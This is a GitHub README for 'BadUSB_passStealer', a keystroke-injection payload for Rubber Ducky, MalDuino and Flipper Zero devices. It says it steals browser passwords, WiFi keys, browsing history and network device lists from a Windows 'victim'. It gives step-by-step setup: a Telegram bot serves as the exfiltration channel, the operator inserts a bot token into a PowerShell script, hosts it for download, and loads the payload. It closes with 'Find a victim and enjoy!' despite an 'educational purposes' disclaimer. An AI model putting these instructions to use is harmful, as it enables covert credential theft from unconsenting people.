# 💀 BadUSB_passStealer

## ⚠️ Warning  
Everything in this repository is **strictly** for educational purposes. **I am not responsible** for any stolen data. **You are responsible** for your actions when using this script for **BadUSB**.  

## ℹ️ About  
This **script** allows you to steal the following **information**:  
🔹 Browser **passwords** (Chrome, Firefox, Opera)  
🔹 **WiFi** passwords  
🔹 Browser **history** from the last 7 days  
🔹 A **list** of all **devices** connected to the victim's network  

## 🔑 Key Information for Users  

### ⚠️ MalDuino & Rubber Ducky Users  
You **must** replace **`CTRL-SHIFT ENTER`** with **`CTRL SHIFT ENTER`** in the [`BadUSB_passStealer.txt`](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file.  

✅ **Flipper Zero users**, no changes are needed—this syntax is already compatible.  

### ⚠️ Arduino Users  
🚫 I **stopped upgrading** `.ino` scripts. If you need them, you can **convert Ducky Scripts** [here](https://duckify.huhn.me/).  

### 🕒 Adjusting Delay  
You can customize the **delays** based on the **speed** of the **target machine**.

### ⏳ Waiting for Execution  
When you plug the **BadUSB** into a PC, **wait for the Caps Lock to flash** before unplugging it.  

---

# 🚀 Getting Started  

## 📌 Requirements  
✔️ A **BadUSB**  
✔️ Install **Arduino software** [here](https://www.arduino.cc/en/software) *(if using an Arduino-based BadUSB)*  
✔️ A **Telegram account**  
✔️ A **victim using Windows 10/11**  

---

# 🤖 Setting up a Telegram Bot for Uploading Files  

## 1️⃣ Create a Telegram Bot  
1️⃣ Open [Telegram Web](https://web.telegram.org/) and log in.  
2️⃣ Search for **@BotFather** in the Telegram search bar.  
3️⃣ Click **Start** to begin a conversation.  
4️⃣ Send `/newbot`.  
5️⃣ Choose a bot **name** and send it.  
6️⃣ Choose a bot **username** and send it.  
7️⃣ **@BotFather** will provide an API token:
   > Done! Congratulations on your new bot. You will find it at t.me/BOT_USERNAME. You can now add a description, about section, and profile picture for your bot. See /help for a list of commands.
   > Use this token to access the HTTP API:
   > **API_ACCESS_TOKEN**
   > For a description of the Bot API, see this page: https://core.telegram.org/bots/api

8️⃣ Start a chat with your bot by clicking **t.me/BOT_USERNAME** and pressing **Start**.  

## 2️⃣ Get Your Telegram API Token  
Your **API token** is provided in **@BotFather**'s response.  

## 3️⃣ Get Your Telegram Chat ID  
1️⃣ Open your browser and replace `API_ACCESS_TOKEN` in this URL:  
   ```
   https://api.telegram.org/bot<API_ACCESS_TOKEN>/getUpdates?offset=0
   ```
2️⃣ Send a **test message** to your bot on Telegram.  
3️⃣ Refresh the API page.  
4️⃣ Find your **chat ID** in the response JSON. Example:  
   ```
   "chat":{"id":123456789,"type":"private"}
   ```
   Your chat ID is **123456789**.  

---

# ⚙️ Installation for Rubber Ducky, Malduino W, and Flipper Zero  

1️⃣ **Download this repository**  

   🔹 **Linux:**  
   ```bash
   git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
   cd BadUSB_passStealer
   ```  

   🔹 **Windows:**  
   - Click the **green "Code" button** at the top right.  
   - Click **"Download ZIP"** and extract it.  

2️⃣ Replace **`<TOKEN>`** and **`<CHATID>`** in [`ps.ps1`](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/ps.ps1).  

3️⃣ **Upload `ps.ps1` to get a downloadable link**.  

4️⃣ Replace **`LINK`** in [`BadUSB_passStealer.txt`](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) with the `ps.ps1` link.  

5️⃣ Place the `.txt` file in your **BadUSB**.  

6️⃣ **Find a victim and enjoy!** 🎭  

---

# 🛠️ NirSoft Tools  

🔗 You can download NirSoft tools here:  

🔹 **[WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip)** *(User: `download` | Password: `nirsoft123!`)*  
🔹 **[WNetWatcher.exe](https://www.nirsoft.net/utils/wireless_network_watcher.html)**  
🔹 **[BrowsingHistoryView.exe](https://www.nirsoft.net/utils/browsing_history_view.html)**  
🔹 **[WirelessKeyView.exe](https://www.nirsoft.net/utils/wireless_key.html)**  
